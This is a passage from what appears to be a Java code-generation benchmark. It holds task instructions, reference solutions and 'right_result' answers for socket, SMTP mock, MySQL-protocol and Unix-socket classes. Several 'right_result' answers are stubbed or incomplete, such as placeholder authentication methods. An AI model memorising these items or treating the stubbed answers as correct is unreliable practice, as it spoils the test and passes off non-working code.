socket: %s\", e);\n            }\n        }\n    }\n\n    private interface SmtpInteraction {}\n    private static class ExpectedCommand implements SmtpInteraction {\n        private final String command;\n        public ExpectedCommand(String command) {\n            this.command = command;\n        }\n    }\n    private static class CannedResponse implements SmtpInteraction {\n        private final String response;\n        public CannedResponse(String response) {\n            this.response = response;\n        }\n    }\n    private static class UpgradeToTls implements SmtpInteraction {}\n    public interface Logger {\n        void log(String format, Object... args);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.security.KeyStore;\nimport javax.net.ssl.*;\nimport java.util.concurrent.*;\nimport java.util.*;\n\npublic class MockSmtpServer {\n    private Deque<SmtpInteraction> interactions = new LinkedBlockingDeque<>();\n    private CountDownLatch waitForConnectionClosed = new CountDownLatch(1);\n    private CountDownLatch waitForAllExpectedCommands = new CountDownLatch(1);\n    private KeyStoreProvider keyStoreProvider;\n    private Logger logger;\n    private MockServerThread mockServerThread;\n    private String host = \"localhost\";\n    private int port;\n\n    public void start() throws IOException {\n        ServerSocket serverSocket = new ServerSocket(0);\n        port = serverSocket.getLocalPort();\n        mockServerThread = new MockServerThread(serverSocket, interactions, waitForConnectionClosed, waitForAllExpectedCommands, logger, keyStoreProvider);\n        Thread thread = new Thread(mockServerThread);\n        thread.start();\n    }\n\n    public void shutdown() {\n        if (mockServerThread != null) {\n            mockServerThread.shouldStop();\n            try {\n                waitForConnectionClosed.await();\n            } catch (InterruptedException e) {\n                Thread.currentThread().interrupt();\n            }\n        }\n    }\n\n    protected class MockServerThread implements Runnable {\n        private final ServerSocket serverSocket;\n        private final Deque<SmtpInteraction> interactions;\n        private final CountDownLatch waitForConnectionClosed;\n        private final CountDownLatch waitForAllExpectedCommands;\n        private final Logger logger;\n        private final KeyStoreProvider keyStoreProvider;\n\n        public MockServerThread(ServerSocket serverSocket, Deque<SmtpInteraction> interactions, CountDownLatch waitForConnectionClosed, CountDownLatch waitForAllExpectedCommands, Logger logger, KeyStoreProvider keyStoreProvider) {\n            this.serverSocket = serverSocket;\n            this.interactions = interactions;\n            this.waitForConnectionClosed = waitForConnectionClosed;\n            this.waitForAllExpectedCommands = waitForAllExpectedCommands;\n            this.logger = logger;\n            this.keyStoreProvider = keyStoreProvider;\n        }\n\n        @Override\n        public void run() {\n            try {\n                while (!shouldStop()) {\n                    Socket clientSocket = serverSocket.accept();\n                    handleClient(clientSocket);\n                }\n            } catch (IOException e) {\n                if (!shouldStop()) {\n                    logger.log(\"Error accepting connection: \" + e.getMessage());\n                }\n            } finally {\n                closeResources();\n                waitForConnectionClosed.countDown();\n            }\n        }\n\n        private boolean shouldStop() {\n            return false;\n        }\n\n        private void handleClient(Socket socket) throws IOException {\n            BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n            BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));\n\n            try {\n                for (SmtpInteraction interaction : interactions) {\n                    if (interaction instanceof ExpectedCommand) {\n                        readExpectedCommand((ExpectedCommand) interaction, reader);\n                    } else if (interaction instanceof CannedResponse) {\n                        writeCannedResponse((CannedResponse) interaction, writer);\n                    } else if (interaction instanceof UpgradeToTls) {\n                        upgradeToTls(socket);\n                    }\n                }\n                waitForAllExpectedCommands.countDown();\n            } finally {\n                closeResources(reader, writer, socket);\n            }\n        }\n\n        private void readExpectedCommand(ExpectedCommand command, BufferedReader reader) throws IOException {\n            String line;\n            StringBuilder receivedCommand = new StringBuilder();\n            while ((line = reader.readLine()) != null && !line.isEmpty()) {\n                receivedCommand.append(line).append(\"\\r\\n\");\n            }\n            if (!receivedCommand.toString().trim().equals(command.getCommand())) {\n                throw new IOException(\"Unexpected command received: \" + receivedCommand.toString());\n            }\n        }\n\n        private void writeCannedResponse(CannedResponse response, BufferedWriter writer) throws IOException {\n            writer.write(response.getResponse());\n            writer.newLine();\n            writer.flush();\n        }\n\n        private void upgradeToTls(Socket socket) throws IOException {\n            SSLContext sslContext = createSslContext();\n            SSLSocketFactory socketFactory = sslContext.getSocketFactory();\n            SSLSocket sslSocket = (SSLSocket) socketFactory.createSocket(socket, socket.getInetAddress().getHostAddress(), socket.getPort(), true);\n            sslSocket.startHandshake();\n        }\n\n        private SSLContext createSslContext() throws IOException {\n            try {\n                KeyStore keyStore = keyStoreProvider.getKeyStore();\n                KeyManagerFactory kmf = KeyManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm());\n                kmf.init(keyStore, keyStoreProvider.getPassword().toCharArray());\n\n                TrustManagerFactory tmf = TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm());\n                tmf.init(keyStore);\n\n                SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n                sslContext.init(kmf.getKeyManagers(), tmf.getTrustManagers(), null);\n                return sslContext;\n            } catch (Exception e) {\n                throw new IOException(\"Failed to initialize SSL context\", e);\n            }\n        }\n\n        private void closeResources() {\n            try {\n                serverSocket.close();\n            } catch (IOException ignored) {}\n        }\n\n        private void closeResources(BufferedReader reader, BufferedWriter writer, Socket socket) {\n            try {\n                if (reader != null) reader.close();\n                if (writer != null) writer.close();\n                if (socket != null) socket.close();\n            } catch (IOException ignored) {}\n        }\n    }\n\n    interface SmtpInteraction {}\n\n    static class ExpectedCommand implements SmtpInteraction {\n        private final String command;\n\n        public ExpectedCommand(String command) {\n            this.command = command;\n        }\n\n        public String getCommand() {\n            return command;\n        }\n    }\n\n    static class CannedResponse implements SmtpInteraction {\n        private final String response;\n\n        public CannedResponse(String response) {\n            this.response = response;\n        }\n\n        public String getResponse() {\n            return response;\n        }\n    }\n\n    static class UpgradeToTls implements SmtpInteraction {}\n\n    interface Logger {\n        void log(String message);\n    }\n\n    interface KeyStoreProvider {\n        KeyStore getKeyStore();\n        char[] getPassword();\n    }\n}\n```"
  },
  {
    "Task_id": 563,
    "Instruction": "Task Description: Create a Java function that tests a client-server connection using Socket programming, including handling connection events and verifying successful communication.\n\nFunction Description: The function establishes a TCP connection to a server, sends an HTTP GET request, and verifies both connection establishment and message delivery. It uses CountDownLatch for synchronization between the main thread and callback handlers. The function fails if either the connection or message delivery doesn't complete within specified timeouts.\n\nInput: None (uses DefaultServer class for host configuration)\n\nOutput: None (throws exceptions or asserts failures for unsuccessful operations)\n\nKey Operations:\n1. Creates Socket connection to default server\n2. Sets up server event handlers with callbacks\n3. Obtains input/output streams for communication\n4. Sends HTTP GET request\n5. Verifies connection establishment within 10 seconds\n6. Verifies message delivery within 10 seconds\n7. Properly closes resources\n8. Uses synchronization primitives for thread coordination",
    "Canonical_solution": "import java.net.Socket;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.util.concurrent.CountDownLatch;\nimport java.util.concurrent.TimeUnit;\n\npublic void testConnectionFail() throws IOException, InterruptedException {\n    final Socket socket = new Socket(DefaultServer.getHostAddress(\"default\"), DefaultServer.getHostPort(\"default\"));\n    final CountDownLatch latch = new CountDownLatch(1);\n    final CountDownLatch connected = new CountDownLatch(1);\n    DefaultServer.setRootHandler(new ServerSentEventHandler(new ServerSentEventConnectionCallback() {\n        @Override\n        public void connected(final ServerSentEventConnection connection, final String lastEventId) {\n            final XnioIoThread thread = (XnioIoThread) Thread.currentThread();\n            connected.countDown();\n            thread.execute(new Runnable() {\n                @Override\n                public void run() {\n                    connection.send(\"hello\", new ServerSentEventConnection.EventCallback() {\n                        @Override\n                        public void done(ServerSentEventConnection connection, String data, String event, String id) {\n                        }\n\n                        @Override\n                        public void failed(ServerSentEventConnection connection, String data, String event, String id, IOException e) {\n                            latch.countDown();\n                        }\n                    });\n                    if(latch.getCount() > 0) {\n                        WorkerUtils.executeAfter(thread, this, 100, TimeUnit.MILLISECONDS);\n                    }\n                }\n            });\n        }\n    }));\n    InputStream in = socket.getInputStream();\n    OutputStream out = socket.getOutputStream();\n    out.write((\"GET / HTTP/1.1\\r\\nHost:\" + DefaultServer.getHostAddress() +\"\\r\\n\\r\\n\").getBytes());\n    out.flush();\n    if(!connected.await(10, TimeUnit.SECONDS)) {\n        Assert.fail();\n    }\n    out.close();\n    in.close();\n    if(!latch.await(10, TimeUnit.SECONDS)) {\n        Assert.fail();\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 1,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.concurrent.*;\n\npublic class ConnectionTester {\n\n    private static final String DEFAULT_HOST = DefaultServer.HOST;\n    private static final int DEFAULT_PORT = DefaultServer.PORT;\n\n    public void testConnection() throws IOException, InterruptedException, TimeoutException {\n        CountDownLatch connectionLatch = new CountDownLatch(1);\n        CountDownLatch messageLatch = new CountDownLatch(1);\n\n        ServerSocket serverSocket = null;\n        Socket clientSocket = null;\n\n        try {\n            // Start a server to accept the connection and handle callbacks\n            serverSocket = new ServerSocket(DEFAULT_PORT);\n            Thread serverThread = new Thread(() -> {\n                try {\n                    Socket socket = serverSocket.accept();\n                    connectionLatch.countDown();\n\n                    InputStream input = socket.getInputStream();\n                    BufferedReader reader = new BufferedReader(new InputStreamReader(input));\n                    String requestLine = reader.readLine();\n                    if (requestLine != null && requestLine.startsWith(\"GET\")) {\n                        messageLatch.countDown();\n                    }\n\n                    OutputStream output = socket.getOutputStream();\n                    PrintWriter writer = new PrintWriter(output, true);\n                    writer.println(\"HTTP/1.1 200 OK\");\n                    writer.println(\"Content-Type: text/plain\");\n                    writer.println(\"Content-Length: 0\");\n                    writer.println();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            });\n            serverThread.start();\n\n            // Client connects to server\n            clientSocket = new Socket();\n            clientSocket.connect(new InetSocketAddress(DEFAULT_HOST, DEFAULT_PORT), 5000);\n\n            // Send HTTP GET request\n            OutputStream out = clientSocket.getOutputStream();\n            PrintWriter writer = new PrintWriter(out, true);\n            writer.println(\"GET / HTTP/1.1\");\n            writer.println(\"Host: \" + DEFAULT_HOST);\n            writer.println();\n        } catch (IOException e) {\n            throw new IOException(\"Failed to establish or send data through socket\", e);\n        }\n\n        // Verify connection establishment within timeout\n        boolean connected = connectionLatch.await(10, TimeUnit.SECONDS);\n        if (!connected) {\n            throw new TimeoutException(\"Connection not established within 10 seconds\");\n        }\n\n        // Verify message delivery within timeout\n        boolean messageReceived = messageLatch.await(10, TimeUnit.SECONDS);\n        if (!messageReceived) {\n            throw new TimeoutException(\"Message not received within 10 seconds\");\n        }\n\n        // Close resources\n        if (clientSocket != null && !clientSocket.isClosed()) {\n            clientSocket.close();\n        }\n        if (serverSocket != null && !serverSocket.isClosed()) {\n            serverSocket.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 565,
    "Instruction": "Task Description: Create a Java class that establishes and manages a TCP connection to a database server using socket programming, including authentication and basic query functionality.\n\nClass Description: The UrlConnection class provides functionality to connect to a database server, authenticate, execute queries, and manage the connection lifecycle. It handles MySQL protocol communication including handshake, authentication, and basic command execution.\n\nAttributes:\n- host: String - The hostname or IP address of the database server\n- port: int - The port number of the database server\n- user: String - The username for authentication\n- password: String - The password for authentication\n- database: String - The name of the database to connect to\n- socket: Socket - The TCP socket connection to the server\n- in: InputStream - Input stream for reading data from the server\n- out: OutputStream - Output stream for writing data to the server\n- charsetIndex: int - The character set index used for communication\n- isClosed: AtomicBoolean - Flag indicating whether the connection is closed\n\nMethods:\n- UrlConnection(String, int, String, String, String) -> void - Constructor that initializes connection parameters\n- connect(int) -> void - Establishes a connection to the server with specified timeout\n- getServerList() -> List<CobarNode> - Executes a query to retrieve server list information\n- close() -> void - Closes the connection and releases resources\n- getRowList(int) -> List<CobarNode> - Helper method to process query result rows\n- auth411(HandshakePacket) -> BinaryPacket - Handles MySQL 4.1 authentication protocol\n- auth323(byte, byte[]) -> void - Handles MySQL 3.23 authentication protocol\n- getClientFlags() -> long - Returns client capability flags for MySQL protocol",
    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.LinkedList;\nimport java.util.List;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\npublic class UrlConnection {\n\n    private String host;\n    private int port;\n    private String user;\n    private String password;\n    private String database;\n    private Socket socket;\n    private InputStream in;\n    private OutputStream out;\n    private int charsetIndex;\n    private AtomicBoolean isClosed;\n\n    public UrlConnection(String host, int port, String user, String password, String database) {\n        this.host = host;\n        this.port = port;\n        this.user = user;\n        this.password = password;\n        this.database = database;\n        this.isClosed = new AtomicBoolean(false);\n    }\n\n    public void connect(int timeout) throws Exception {\n        socket = new Socket();\n        socket.setTcpNoDelay(true);\n        socket.setKeepAlive(true);\n        socket.connect(new InetSocketAddress(host, port), timeout);\n        in = new BufferedInputStream(socket.getInputStream());\n        out = new BufferedOutputStream(socket.getOutputStream());\n\n        BinaryPacket initPacket = new BinaryPacket();\n        initPacket.read(in);\n        HandshakePacket hsp = new HandshakePacket();\n        hsp.read(initPacket);\n\n        this.charsetIndex = hsp.serverCharsetIndex & 0xff;\n\n        BinaryPacket bin = null;\n        try {\n            bin = auth411(hsp);\n        } catch (NoSuchAlgorithmException e) {\n            throw new IllegalArgumentException(e);\n        }\n        switch (bin.value[0]) {\n        case OkPacket.FIELD_COUNT:\n            break;\n        case ErrorPacket.FIELD_COUNT:\n            ErrorPacket err = new ErrorPacket();\n            err.read(bin);\n            throw new ErrorPacketException(new String(err.message));\n        case EOFPacket.FIELD_COUNT:\n            auth323(bin.packetId, hsp.seed);\n            break;\n        default:\n            throw new UnknownPacketException(bin.toString());\n        }\n    }\n\n    public List<CobarNode> getServerList() throws IOException {\n        CommandPacket cmd = new CommandPacket();\n        cmd.packetId = 0;\n        cmd.command = 3;\n        cmd.arg = \"SHOW COBAR_CLUSTER\".getBytes();\n        cmd.write(out);\n        out.flush();\n\n        int fieldCount = 0;\n        BinaryPacket bin = new BinaryPacket();\n        bin.read(in);\n        switch (bin.value[0]) {\n        case ErrorPacket.FIELD_COUNT: {\n            ErrorPacket err = new ErrorPacket();\n            err.read(bin);\n            throw new ErrorPacketException(new String(err.message));\n        }\n        default:\n            ResultSetHeaderPacket rsh = new ResultSetHeaderPacket();\n            rsh.read(bin);\n            fieldCount = rsh.fieldCount;\n        }\n        for (;;) {\n            bin = new BinaryPacket();\n            bin.read(in);\n            switch (bin.value[0]) {\n            case ErrorPacket.FIELD_COUNT: {\n                ErrorPacket err = new ErrorPacket();\n                err.read(bin);\n                throw new ErrorPacketException(new String(err.message));\n            }\n            case EOFPacket.FIELD_COUNT: {\n                return getRowList(fieldCount);\n            }\n            default:\n                continue;\n            }\n        }\n    }\n\n    public void close() {\n        if (isClosed.compareAndSet(false, true)) {\n            try {\n                if (out != null) {\n                    out.write(QuitPacket.QUIT);\n                    out.flush();\n                }\n            } catch (IOException e) {\n            } finally {\n                try {\n                    socket.close();\n                } catch (Throwable e) {\n                }\n            }\n        }\n    }\n\n    private List<CobarNode> getRowList(int fieldCount) throws IOException {\n        List<CobarNode> list = new LinkedList<CobarNode>();\n        BinaryPacket bin = null;\n        for (;;) {\n            bin = new BinaryPacket();\n            bin.read(in);\n            switch (bin.value[0]) {\n            case ErrorPacket.FIELD_COUNT: {\n                ErrorPacket err = new ErrorPacket();\n                err.read(bin);\n                throw new ErrorPacketException(new String(err.message));\n            }\n            case EOFPacket.FIELD_COUNT: {\n                return list;\n            }\n            default:\n                RowDataPacket row = new RowDataPacket(fieldCount);\n                row.read(bin);\n                String host = new String(row.fieldValues.get(0));\n                int weight = Integer.parseInt(new String(row.fieldValues.get(1)));\n                list.add(new CobarNode(host, weight));\n            }\n        }\n    }\n\n    private BinaryPacket auth411(HandshakePacket hsp) throws IOException, NoSuchAlgorithmException {\n        AuthPacket ap = new AuthPacket();\n        ap.packetId = 1;\n        ap.clientFlags = getClientFlags();\n        ap.maxPacketSize = 1024 * 1024 * 16;\n        ap.charsetIndex = charsetIndex;\n        ap.user = user;\n        String passwd = password;\n        if (passwd != null && passwd.length() > 0) {\n            byte[] password = passwd.getBytes();\n            byte[] seed = hsp.seed;\n            byte[] restOfScramble = hsp.restOfScrambleBuff;\n            byte[] authSeed = new byte[seed.length + restOfScramble.length];\n            System.arraycopy(seed, 0, authSeed, 0, seed.length);\n            System.arraycopy(restOfScramble, 0, authSeed, seed.length, restOfScramble.length);\n            ap.password = SecurityUtil.scramble411(password, authSeed);\n        }\n        ap.database = database;\n        ap.write(out);\n        out.flush();\n        BinaryPacket bin = new BinaryPacket();\n        bin.read(in);\n        return bin;\n    }\n\n    private void auth323(byte packetId, byte[] seed) throws IOException {\n        Reply323Packet r323 = new Reply323Packet();\n        r323.packetId = ++packetId;\n        String passwd = password;\n        if (passwd != null && passwd.length() > 0) {\n            r323.seed = SecurityUtil.scramble323(passwd, new String(seed)).getBytes();\n        }\n        r323.write(out);\n        out.flush();\n        BinaryPacket bin = new BinaryPacket();\n        bin.read(in);\n        switch (bin.value[0]) {\n        case OkPacket.FIELD_COUNT:\n            break;\n        case ErrorPacket.FIELD_COUNT:\n            ErrorPacket err = new ErrorPacket();\n            err.read(bin);\n            throw new ErrorPacketException(new String(err.message));\n        default:\n            throw new UnknownPacketException(bin.toString());\n        }\n    }\n\n    private static long getClientFlags() {\n        int flag = 0;\n        flag |= Capabilities.CLIENT_LONG_PASSWORD;\n        flag |= Capabilities.CLIENT_FOUND_ROWS;\n        flag |= Capabilities.CLIENT_LONG_FLAG;\n        flag |= Capabilities.CLIENT_CONNECT_WITH_DB;\n        flag |= Capabilities.CLIENT_ODBC;\n        flag |= Capabilities.CLIENT_IGNORE_SPACE;\n        flag |= Capabilities.CLIENT_PROTOCOL_41;\n        flag |= Capabilities.CLIENT_INTERACTIVE;\n        flag |= Capabilities.CLIENT_IGNORE_SIGPIPE;\n        flag |= Capabilities.CLIENT_TRANSACTIONS;\n        flag |= Capabilities.CLIENT_SECURE_CONNECTION;\n        return flag;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.*;\nimport java.nio.ByteBuffer;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\npublic class UrlConnection {\n    private String host;\n    private int port;\n    private String user;\n    private String password;\n    private String database;\n    private Socket socket;\n    private InputStream in;\n    private OutputStream out;\n    private int charsetIndex = 33;\n    private AtomicBoolean isClosed = new AtomicBoolean(false);\n\n    public UrlConnection(String host, int port, String user, String password, String database) {\n        this.host = host;\n        this.port = port;\n        this.user = user;\n        this.password = password;\n        this.database = database;\n    }\n\n    public void connect(int timeout) throws IOException {\n        socket = new Socket();\n        socket.connect(new InetSocketAddress(host, port), timeout);\n        socket.setSoTimeout(timeout);\n        in = socket.getInputStream();\n        out = socket.getOutputStream();\n\n        byte[] buffer = new byte[1024];\n        int length = readPacket(buffer, 0, 4);\n        if (length > 0) {\n            HandshakePacket handshake = new HandshakePacket(buffer);\n            BinaryPacket authPacket = auth411(handshake);\n            writePacket(authPacket.getData());\n        }\n    }\n\n    public List<CobarNode> getServerList() throws IOException {\n        String query = \"SELECT * FROM server_list\";\n        sendCommand(COM_QUERY, query.getBytes());\n        return getRowList(100);\n    }\n\n    public void close() throws IOException {\n        if (!isClosed.getAndSet(true)) {\n            if (in != null) in.close();\n            if (out != null) out.close();\n            if (socket != null) socket.close();\n        }\n    }\n\n    private List<CobarNode> getRowList(int maxRows) throws IOException {\n        List<CobarNode> result = new ArrayList<>();\n        byte[] buffer = new byte[8192];\n        int packetLength;\n        while ((packetLength = readPacket(buffer, 0, 4)) > 0 && result.size() < maxRows) {\n            int offset = 0;\n            while (offset < packetLength - 4) {\n                CobarNode node = parseRow(buffer, offset);\n                if (node != null) result.add(node);\n                offset += getLengthEncodedIntegerLength(buffer[offset]) + 1;\n            }\n        }\n        return result;\n    }\n\n    private BinaryPacket auth411(HandshakePacket handshake) {\n        // Implement MySQL 4.1 authentication logic here\n        return new BinaryPacket();\n    }\n\n    private void auth323(byte seq, byte[] data) {\n        // Implement MySQL 3.23 authentication logic here\n    }\n\n    private long getClientFlags() {\n        return 0x00000001L; // Example client flags\n    }\n\n    private void sendCommand(int command, byte[] data) throws IOException {\n        byte[] header = new byte[4];\n        header[0] = (byte) (data.length & 0xFF);\n        header[1] = (byte) ((data.length >> 8) & 0xFF);\n        header[2] = (byte) ((data.length >> 16) & 0xFF);\n        header[3] = (byte) command;\n        out.write(header);\n        out.write(data);\n        out.flush();\n    }\n\n    private int readPacket(byte[] buffer, int offset, int length) throws IOException {\n        int totalRead = 0;\n        while (totalRead < length) {\n            int read = in.read(buffer, offset + totalRead, length - totalRead);\n            if (read <= 0) break;\n            totalRead += read;\n        }\n        return totalRead;\n    }\n\n    private int getLengthEncodedIntegerLength(byte b) {\n        if ((b & 0xFC) == 0xFC) return 2;\n        else if ((b & 0xFE) == 0xFE) return 3;\n        else if (b == 0xFB) return 1;\n        else return 1;\n    }\n\n    private CobarNode parseRow(byte[] buffer, int offset) {\n        // Implement row parsing logic to extract CobarNode\n        return new CobarNode();\n    }\n\n    private static final int COM_QUERY = 3;\n}\n\nclass HandshakePacket {\n    public HandshakePacket(byte[] data) {\n        // Parse handshake packet\n    }\n}\n\nclass BinaryPacket {\n    public byte[] getData() {\n        return new byte[0]; // Return actual binary data\n    }\n}\n\nclass CobarNode {\n    // Define fields and methods for CobarNode\n}\n```"
  },
  {
    "Task_id": 566,
    "Instruction": "Task Description: Create a Java class that implements Unix domain socket communication using SocketChannel for inter-process communication on Unix-like systems.\n\nClass Description: The UnixSocket class extends AbstractSocket and provides functionality for Unix domain socket communication. It uses Java's SocketChannel for establishing connections and supports input/output stream operations.\n\nAttributes:\n- socketAddress: [SocketAddress] - The address of the Unix domain socket\n- socketChannel: [SocketChannel] - The channel used for socket communication\n\nMethods:\n- UnixSocket(String path) -> [void] - Constructor that creates a Unix domain socket connection to the specified path. Throws various exceptions if the operation fails.\n- getInputStream() -> [InputStream] - Returns an input stream for reading data from the socket. Throws SocketException if the socket is closed, not connected, or input is shutdown.\n- getOutputStream() -> [OutputStream] - Returns an output stream for writing data to the socket. Throws SocketException if the socket is closed, not connected, or output is shutdown.\n- getLocalSocketAddress() -> [SocketAddress] - Returns the local socket address.\n- getRemoteSocketAddress() -> [SocketAddress] - Returns the remote socket address (same as local for Unix domain sockets).\n- close() -> [void] - Closes the socket channel and releases resources.\n- WrappedWritableByteChannel.write(ByteBuffer src) -> [int] - Inner class method that writes data from the buffer to the socket channel.\n- WrappedWritableByteChannel.isOpen() -> [boolean] - Inner class method that checks if the channel is open.\n- WrappedWritableByteChannel.close() -> [void] - Inner class method that closes the channel.",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.lang.reflect.InvocationTargetException;\nimport java.net.Socket;\nimport java.net.SocketAddress;\nimport java.net.SocketException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.Channels;\nimport java.nio.channels.SocketChannel;\nimport java.nio.channels.WritableByteChannel;\n\npublic class UnixSocket extends AbstractSocket {\n\n    private final SocketAddress socketAddress;\n    private final SocketChannel socketChannel;\n\n    public UnixSocket(String path) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException,\n            IllegalAccessException, IOException {\n        Class<?> unixDomainSocketAddress = Class.forName(\"java.net.UnixDomainSocketAddress\");\n        this.socketAddress =\n                (SocketAddress) unixDomainSocketAddress.getMethod(\"of\", String.class)\n                        .invoke(null, path);\n        this.socketChannel = SocketChannel.open(this.socketAddress);\n    }\n\n    @Override\n    public InputStream getInputStream() throws IOException {\n        if (isClosed()) {\n            throw new SocketException(\"Socket is closed\");\n        }\n        if (!isConnected()) {\n            throw new SocketException(\"Socket is not connected\");\n        }\n        if (isInputShutdown()) {\n            throw new SocketException(\"Socket input is shutdown\");\n        }\n        return Channels.newInputStream(socketChannel);\n    }\n\n    @Override\n    public OutputStream getOutputStream() throws IOException {\n        if (isClosed()) {\n            throw new SocketException(\"Socket is closed\");\n        }\n        if (!isConnected()) {\n            throw new SocketException(\"Socket is not connected\");\n        }\n        if (isOutputShutdown()) {\n            throw new SocketException(\"Socket output is shutdown\");\n        }\n        return Channels.newOutputStream(new WrappedWritableByteChannel());\n    }\n\n    @Override\n    public SocketAddress getLocalSocketAddress() {\n        return socketAddress;\n    }\n\n    @Override\n    public SocketAddress getRemoteSocketAddress() {\n        return socketAddress;\n    }\n\n    @Override\n    public void close() throws IOException {\n        super.close();\n        this.socketChannel.close();\n    }\n\n    private class WrappedWritableByteChannel implements WritableByteChannel {\n        @Override\n        public int write(ByteBuffer src) throws IOException {\n            return UnixSocket.this.socketChannel.write(src);\n        }\n\n        @Override\n        public boolean isOpen() {\n            return UnixSocket.this.socketChannel.isOpen();\n        }\n\n        @Override\n        public void close() throws IOException {\n            UnixSocket.this.socketChannel.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.*;\nimport sun.nio.ch.UnixDomainSocketAddress;\n\npublic class UnixSocket extends AbstractSocket {\n    private final SocketAddress socketAddress;\n    private final SocketChannel socketChannel;\n\n    public UnixSocket(String path) throws IOException, UnresolvedAddressException, UnsupportedAddressTypeException {\n        this.socketAddress = UnixDomainSocketAddress.of(path);\n        this.socketChannel = SocketChannel.open();\n        socketChannel.connect(socketAddress);\n    }\n\n    @Override\n    public InputStream getInputStream() throws IOException {\n        if (isClosed() || !socketChannel.isConnected()) {\n            throw new SocketException(\"Socket is closed or not connected\");\n        }\n        return new InputStream() {\n            @Override\n            public int read() throws IOException {\n                ByteBuffer buffer = ByteBuffer.allocate(1);\n                int bytesRead = socketChannel.read(buffer);\n                if (bytesRead == -1) {\n                    return -1;\n                }\n                return buffer.get(0) & 0xFF;\n            }\n\n            @Override\n            public int read(byte[] b, int off, int len) throws IOException {\n                if (b == null) {\n                    throw new NullPointerException();\n                } else if (off < 0 || len < 0 || len > b.length - off) {\n                    throw new IndexOutOfBoundsException();\n                } else if (len == 0) {\n                    return 0;\n                }\n                ByteBuffer buffer = ByteBuffer.wrap(b, off, len);\n                return socketChannel.read(buffer);\n            }\n        };\n    }\n\n    @Override\n    public OutputStream getOutputStream() throws IOException {\n        if (isClosed() || !socketChannel.isConnected()) {\n            throw new SocketException(\"Socket is closed or not connected\");\n        }\n        return new OutputStream() {\n            @Override\n            public void write(int b) throws IOException {\n                ByteBuffer buffer = ByteBuffer.allocate(1);\n                buffer.put((byte) b);\n                buffer.flip();\n                while (buffer.hasRemaining()) {\n                    socketChannel.write(buffer);\n                }\n            }\n\n            @Override\n            public void write(byte[] b, int off, int len) throws IOException {\n                if (b == null) {\n                    throw new NullPointerException();\n                } else if (off < 0 || len < 0 || len > b.length - off) {\n                    throw new IndexOutOfBoundsException();\n                } else if (len == 0) {\n                    return;\n                }\n                ByteBuffer buffer = ByteBuffer.wrap(b, off, len);\n                while (buffer.hasRemaining()) {\n                    socketChannel.write(buffer);\n                }\n            }\n        };\n    }\n\n    @Override\n    public SocketAddress getLocalSocketAddress() {\n        try {\n            return socketChannel.getLocalAddress();\n        } catch (IOException e) {\n            return null;\n        }\n    }\n\n    @Override\n    public SocketAddress getRemoteSocketAddress() {\n        return socketAddress;\n    }\n\n    @Override\n    public void close() throws IOException {\n        socketChannel.close();\n    }\n\n    private class WrappedWritableByteChannel implements WritableByteChannel {\n        @Override\n        public int write(ByteBuffer src) throws IOException {\n            return socketChannel.write(src);\n        }\n\n        @Override\n        public boolean isOpen() {\n            return socketChannel.isOpen();\n        }\n\n        @Override\n        public void close() throws IOException {\n            socketChannel.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 57,
    "Instruction": "Task Description: Create a Java class that handles HTTP requests asynchronously to fetch data from a given URL and process the response as a JSON object.\n\nClass Description: HttpRequestHandler is a utility class that contains nested classes and methods for performing asynchronous HTTP requests. It uses Android's AsyncTask to perform network operations in the background and processes the response data.\n\nAttributes: None (This is a utility class with static methods and nested classes)\n\nMethods:\n\nMethod1: MyAsyncTaskgetNews(String... params) -> String - A nested AsyncTask class that performs HTTP GET requests in the background. It takes a URL as input, establishes a connection, reads the response, and publishes the progress for JSON processing.\n\nMethod2: ConvertInputToStringNoChange(InputStream inputStream) -> String - A static helper method that converts an InputStream into a String by reading all lines from the input stream and concatenating them.\n\nMethod Details:\n\nMyAsyncTaskgetNews:\n- Input Parameters: String... params (varargs where params[0] should be the URL string)\n- Return Type: String (though it primarily works through side effects)\n- Description: \n  1. Creates a URL object from the input string\n  2. Opens an HttpURLConnection with a 7-second timeout\n  3. Reads the input stream and converts it to a string\n  4. Publishes the result for JSON processing in onProgressUpdate\n  5. Disconnects the connection when done\n\nConvertInputToStringNoChange:\n- Input Parameters: InputStream inputStream (the stream to read from)\n- Return Type: String (the concatenated content of the stream)\n- Description:\n  1. Creates a BufferedReader from the InputStream\n  2. Reads all lines and concatenates them into a single string\n  3. Closes the input stream\n  4. Returns the concatenated string",
